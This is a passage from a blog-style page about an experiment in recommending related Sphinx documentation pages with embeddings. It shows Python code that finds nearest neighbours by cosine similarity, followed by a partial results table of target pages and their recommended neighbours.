    <span>cosine_sim</span> <span>=</span> <span>cosine_similarity</span><span>(</span><span>target</span><span>,</span> <span>embeddings</span><span>)</span>
    <span># Sort the data by similarity in descending order and take the top k items</span>
    <span>sorted_indices</span> <span>=</span> <span>np</span><span>.</span><span>argsort</span><span>(</span><span>cosine_sim</span><span>[</span><span>0</span><span>])[::</span><span>-</span><span>1</span><span>]</span>
    <span># Take the top k related embeddings</span>
    <span>top_k_related_embeddings</span> <span>=</span> <span>embeddings</span><span>[</span><span>sorted_indices</span><span>[:</span><span>k</span><span>]]</span>
    <span>top_k_related_embeddings</span> <span>=</span> <span>[</span>
        <span>list</span><span>(</span><span>row</span><span>[:])</span> <span>for</span> <span>row</span> <span>in</span> <span>top_k_related_embeddings</span>
    <span>]</span>  <span># convert to list</span>
    <span>return</span> <span>top_k_related_embeddings</span>


<span>with</span> <span>open</span><span>(</span><span>'doc/embeddings.json'</span><span>,</span> <span>'r'</span><span>)</span> <span>as</span> <span>f</span><span>:</span>
    <span>data</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>f</span><span>)</span>
<span>embeddings</span> <span>=</span> <span>[</span><span>data</span><span>[</span><span>docname</span><span>][</span><span>'embedding'</span><span>]</span> <span>for</span> <span>docname</span> <span>in</span> <span>data</span><span>]</span>
<span>print</span><span>(</span><span>'.. csv-table::'</span><span>)</span>
<span>print</span><span>(</span><span>'   :header: "Target", "Neighbor"'</span><span>)</span>
<span>print</span><span>()</span>
<span>for</span> <span>target</span> <span>in</span> <span>embeddings</span><span>:</span>
    <span>dot_products</span> <span>=</span> <span>np</span><span>.</span><span>dot</span><span>(</span><span>embeddings</span><span>,</span> <span>target</span><span>)</span>
    <span>neighbors</span> <span>=</span> <span>k_nearest_neighbors</span><span>(</span><span>target</span><span>,</span> <span>embeddings</span><span>,</span> <span>k</span><span>=</span><span>3</span><span>)</span>
    <span># ignore neighbors[0] because that is always the target itself</span>
    <span>nearest_neighbor</span> <span>=</span> <span>neighbors</span><span>[</span><span>1</span><span>]</span>
    <span>target_docname</span> <span>=</span> <span>find_docname</span><span>(</span><span>data</span><span>,</span> <span>target</span><span>)</span>
    <span>target_cell</span> <span>=</span> <span>f</span><span>'`</span><span>{</span><span>target_docname</span><span>}</span><span> &lt;https://www.sphinx-doc.org/en/master/</span><span>{</span><span>target_docname</span><span>}</span><span>.html&gt;`_'</span>
    <span>neighbor_docname</span> <span>=</span> <span>find_docname</span><span>(</span><span>data</span><span>,</span> <span>nearest_neighbor</span><span>)</span>
    <span>neighbor_cell</span> <span>=</span> <span>f</span><span>'`</span><span>{</span><span>neighbor_docname</span><span>}</span><span> &lt;https://www.sphinx-doc.org/en/master/</span><span>{</span><span>neighbor_docname</span><span>}</span><span>.html&gt;`_'</span>
    <span>print</span><span>(</span><span>f</span><span>'   "</span><span>{</span><span>target_cell</span><span>}</span><span>", "</span><span>{</span><span>neighbor_cell</span><span>}</span><span>"'</span><span>)</span>
</pre></div>
<p>As you may have noticed, I did not actually implement the recommendation
UI in this experiment. My main goal was to get basic data on whether
the embeddings approach generates decent recommendations or not.</p>
</section>
<section id="results">
<span id="underrated-appendix-results"></span><h3>Results<a href="#results" title="Link to this heading">§</a></h3>
<p>How to interpret the data: <code><span>Target</span></code> would be the page that you’re
currently on. <code><span>Neighbor</span></code> would be the recommended page.</p>
<table>
<thead>
<tr><th><p>Target</p></th>
<th><p>Neighbor</p></th>
</tr>
</thead>
<tbody>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/authors.html">authors</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.6.html">changes/0.6</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.1.html">changes/0.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.5.html">changes/0.5</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.2.html">changes/0.2</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.2.html">changes/1.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.3.html">changes/0.3</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.4.html">changes/0.4</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.4.html">changes/0.4</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.2.html">changes/1.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.5.html">changes/0.5</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.6.html">changes/0.6</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/0.6.html">changes/0.6</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.6.html">changes/1.6</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.0.html">changes/1.0</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.3.html">changes/1.3</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.1.html">changes/1.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.2.html">changes/1.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.2.html">changes/1.2</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.1.html">changes/1.1</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.3.html">changes/1.3</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.4.html">changes/1.4</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.4.html">changes/1.4</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.3.html">changes/1.3</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.5.html">changes/1.5</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.6.html">changes/1.6</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.6.html">changes/1.6</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.5.html">changes/1.5</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.7.html">changes/1.7</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.8.html">changes/1.8</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.8.html">changes/1.8</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.6.html">changes/1.6</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/2.0.html">changes/2.0</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.8.html">changes/1.8</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/2.1.html">changes/2.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.2.html">changes/1.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/2.2.html">changes/2.2</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.2.html">changes/1.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/2.3.html">changes/2.3</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/2.1.html">changes/2.1</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/2.4.html">changes/2.4</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.5.html">changes/3.5</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.0.html">changes/3.0</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.3.html">changes/4.3</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.1.html">changes/3.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.3.html">changes/3.3</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.2.html">changes/3.2</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.0.html">changes/3.0</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.3.html">changes/3.3</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.1.html">changes/3.1</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.4.html">changes/3.4</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.3.html">changes/4.3</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.5.html">changes/3.5</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.3.html">changes/1.3</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.0.html">changes/4.0</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.0.html">changes/3.0</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.1.html">changes/4.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.4.html">changes/4.4</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.2.html">changes/4.2</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.4.html">changes/4.4</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.3.html">changes/4.3</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.0.html">changes/3.0</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.4.html">changes/4.4</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.4.html">changes/7.4</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.5.html">changes/4.5</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/4.4.html">changes/4.4</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/5.0.html">changes/5.0</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.5.html">changes/3.5</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/5.1.html">changes/5.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/5.0.html">changes/5.0</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/5.2.html">changes/5.2</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/3.5.html">changes/3.5</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/5.3.html">changes/5.3</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/5.2.html">changes/5.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/6.0.html">changes/6.0</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/6.2.html">changes/6.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/6.1.html">changes/6.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/6.2.html">changes/6.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/6.2.html">changes/6.2</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/6.1.html">changes/6.1</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.0.html">changes/7.0</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/deprecated.html">extdev/deprecated</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.1.html">changes/7.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.2.html">changes/7.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.2.html">changes/7.2</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.4.html">changes/7.4</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.3.html">changes/7.3</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.4.html">changes/7.4</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.4.html">changes/7.4</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/7.3.html">changes/7.3</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/8.0.html">changes/8.0</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/8.1.html">changes/8.1</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/8.1.html">changes/8.1</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.8.html">changes/1.8</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/changes/index.html">changes/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/8.0.html">changes/8.0</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/howtos/builders.html">development/howtos/builders</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/index.html">usage/extensions/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/howtos/index.html">development/howtos/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/index.html">development/tutorials/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/howtos/setup_extension.html">development/howtos/setup_extension</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/index.html">usage/extensions/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/html_themes/index.html">development/html_themes/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/theming.html">usage/theming</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/html_themes/templating.html">development/html_themes/templating</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/development/html_themes/index.html">development/html_themes/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/index.html">development/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/index.html">usage/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/adding_domain.html">development/tutorials/adding_domain</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/domainapi.html">extdev/domainapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/autodoc_ext.html">development/tutorials/autodoc_ext</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html">usage/extensions/autodoc</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/examples/README.html">development/tutorials/examples/README</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/end.html">tutorial/end</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/extending_build.html">development/tutorials/extending_build</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/todo.html">usage/extensions/todo</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/extending_syntax.html">development/tutorials/extending_syntax</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/markupapi.html">extdev/markupapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/index.html">development/tutorials/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/development/howtos/index.html">development/howtos/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/examples.html">examples</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/index.html">index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/appapi.html">extdev/appapi</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/index.html">extdev/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/builderapi.html">extdev/builderapi</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/builders/index.html">usage/builders/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/collectorapi.html">extdev/collectorapi</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/envapi.html">extdev/envapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/deprecated.html">extdev/deprecated</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.8.html">changes/1.8</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/domainapi.html">extdev/domainapi</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/index.html">usage/domains/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/envapi.html">extdev/envapi</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/collectorapi.html">extdev/collectorapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/event_callbacks.html">extdev/event_callbacks</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/appapi.html">extdev/appapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/i18n.html">extdev/i18n</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/intl.html">usage/advanced/intl</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/index.html">extdev/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/appapi.html">extdev/appapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/logging.html">extdev/logging</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/appapi.html">extdev/appapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/markupapi.html">extdev/markupapi</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/development/tutorials/extending_syntax.html">development/tutorials/extending_syntax</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/nodes.html">extdev/nodes</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/domainapi.html">extdev/domainapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/parserapi.html">extdev/parserapi</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/appapi.html">extdev/appapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/projectapi.html">extdev/projectapi</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/envapi.html">extdev/envapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/testing.html">extdev/testing</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/internals/contributing.html">internals/contributing</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/extdev/utils.html">extdev/utils</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/appapi.html">extdev/appapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/faq.html">faq</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/configuration.html">usage/configuration</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/glossary.html">glossary</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/quickstart.html">usage/quickstart</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/index.html">index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/quickstart.html">usage/quickstart</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/internals/code-of-conduct.html">internals/code-of-conduct</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/internals/index.html">internals/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/internals/contributing.html">internals/contributing</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/intl.html">usage/advanced/intl</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/internals/index.html">internals/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/index.html">usage/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/internals/organization.html">internals/organization</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/internals/contributing.html">internals/contributing</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/internals/release-process.html">internals/release-process</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/deprecated.html">extdev/deprecated</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/latex.html">latex</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/configuration.html">usage/configuration</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/man/index.html">man/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/index.html">usage/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/man/sphinx-apidoc.html">man/sphinx-apidoc</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/man/sphinx-autogen.html">man/sphinx-autogen</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/man/sphinx-autogen.html">man/sphinx-autogen</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/autosummary.html">usage/extensions/autosummary</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/man/sphinx-build.html">man/sphinx-build</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/configuration.html">usage/configuration</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/man/sphinx-quickstart.html">man/sphinx-quickstart</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/getting-started.html">tutorial/getting-started</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/support.html">support</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/end.html">tutorial/end</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/automatic-doc-generation.html">tutorial/automatic-doc-generation</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/autosummary.html">usage/extensions/autosummary</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/deploying.html">tutorial/deploying</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/first-steps.html">tutorial/first-steps</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/describing-code.html">tutorial/describing-code</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/index.html">usage/domains/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/end.html">tutorial/end</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/index.html">usage/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/first-steps.html">tutorial/first-steps</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/getting-started.html">tutorial/getting-started</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/getting-started.html">tutorial/getting-started</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/index.html">tutorial/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/index.html">tutorial/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/getting-started.html">tutorial/getting-started</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/more-sphinx-customization.html">tutorial/more-sphinx-customization</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/theming.html">usage/theming</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/narrative-documentation.html">tutorial/narrative-documentation</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/quickstart.html">usage/quickstart</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/intl.html">usage/advanced/intl</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/internals/contributing.html">internals/contributing</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/api.html">usage/advanced/websupport/api</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/quickstart.html">usage/advanced/websupport/quickstart</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/index.html">usage/advanced/websupport/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/quickstart.html">usage/advanced/websupport/quickstart</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/quickstart.html">usage/advanced/websupport/quickstart</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/api.html">usage/advanced/websupport/api</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/searchadapters.html">usage/advanced/websupport/searchadapters</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/api.html">usage/advanced/websupport/api</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/storagebackends.html">usage/advanced/websupport/storagebackends</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/advanced/websupport/api.html">usage/advanced/websupport/api</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/builders/index.html">usage/builders/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/configuration.html">usage/configuration</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/configuration.html">usage/configuration</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/changes/1.2.html">changes/1.2</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/c.html">usage/domains/c</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/cpp.html">usage/domains/cpp</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/cpp.html">usage/domains/cpp</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/c.html">usage/domains/c</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/index.html">usage/domains/index</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/domainapi.html">extdev/domainapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/javascript.html">usage/domains/javascript</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/python.html">usage/domains/python</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/mathematics.html">usage/domains/mathematics</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/referencing.html">usage/referencing</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/python.html">usage/domains/python</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/domainapi.html">extdev/domainapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/restructuredtext.html">usage/domains/restructuredtext</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/extdev/markupapi.html">extdev/markupapi</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/standard.html">usage/domains/standard</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/domains/index.html">usage/domains/index</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html">usage/extensions/autodoc</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/tutorial/automatic-doc-generation.html">tutorial/automatic-doc-generation</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/autosectionlabel.html">usage/extensions/autosectionlabel</a></p></td>
<td><p><a href="https://www.sphinx-doc.org/en/master/usage/quickstart.html">usage/quickstart</a></p></td>
</tr>
<tr><td><p><a href="https://www.sphinx-doc.org/en/master/usage/extensions/autosummary.html">usage/extensions/autosummary</a></p></td>
